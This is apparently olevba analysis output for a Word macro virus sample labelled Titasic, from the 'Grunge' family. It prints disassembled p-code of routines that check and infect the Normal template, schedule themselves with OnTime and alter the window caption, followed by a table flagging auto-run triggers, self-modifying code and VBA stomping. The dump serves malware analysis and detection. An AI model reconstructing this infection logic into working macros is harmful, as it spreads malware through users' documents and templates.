' 	MemSt ShowVisualBasicEditor 
' Line #161:
' Line #162:
' 	EndSub 
' Line #163:
' 	FuncDefn (Sub CapWord(Nm As String, Pan As Integer))
' Line #164:
' 	OnError (Resume Next) 
' Line #165:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt Caption 
' Line #166:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Pan 
' 	For 
' Line #167:
' 	StartForVariable 
' 	Ld K 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x7530 
' 	For 
' Line #168:
' 	StartForVariable 
' 	Ld K 
' 	EndForVariable 
' 	NextVar 
' Line #169:
' 	Ld Nm 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Mid$$ 0x0003 
' 	Ld Application 
' 	MemSt Caption 
' Line #170:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #171:
' 	EndSub 
' Line #172:
' 	FuncDefn (Sub Saving())
' Line #173:
' 	OnError (Resume Next) 
' Line #174:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #175:
' 	MemLdWith ActiveDocument 
' 	ArgsCall GrungeBersih 0x0001 
' Line #176:
' 	MemLdWith NormalTemplate 
' 	ArgsCall GrungeBersih 0x0001 
' Line #177:
' 	ArgsCall SalinKemana 0x0000 
' Line #178:
' 	MemLdWith ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #179:
' 	MemLdWith NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #180:
' 	Ld MG2 
' 	LitDI2 0x0014 
' 	ArgsCall CapWord 0x0002 
' Line #181:
' 	EndWith 
' Line #182:
' 	EndSub 
' Line #183:
' 	FuncDefn (Sub GrungeSave())
' Line #184:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:04"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x000B "SalinKemana"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #185:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:05"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0006 "Saving"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #186:
' 	EndSub 
' Line #187:
' 	FuncDefn (Sub SalinKemana())
' Line #188:
' 	Dim 
' 	VarDefn MacCek (As Boolean)
' Line #189:
' 	LitVarSpecial (False)
' 	St MacCek 
' Line #190:
' 	StartForVariable 
' 	Ld NamaMAc 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #191:
' 	Ld NamaMAc 
' 	MemLd New 
' 	LitStr 0x000A "GrungeKill"
' 	Eq 
' 	IfBlock 
' Line #192:
' 	LitVarSpecial (True)
' 	St MacCek 
' Line #193:
' 	EndIfBlock 
' Line #194:
' 	StartForVariable 
' 	Ld NamaMAc 
' 	EndForVariable 
' 	NextVar 
' Line #195:
' 	Ld MacCek 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #196:
' 	ArgsCall PanggilDoc 0x0000 
' Line #197:
' 	ElseBlock 
' Line #198:
' 	ArgsCall PanggilTemp 0x0000 
' Line #199:
' 	EndIfBlock 
' Line #200:
' 	EndSub 
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Grunge 2000
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Grunge@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial Narrow
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I Hate EveryBody If everyBody Not Like Me.D
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CmdOK'" IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LblInfo'" IN './Virus.MSWord.Titasic.o' - OLE stream: 'Macros/GrungeStill'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CmdOK_Click         |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |UserForm_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

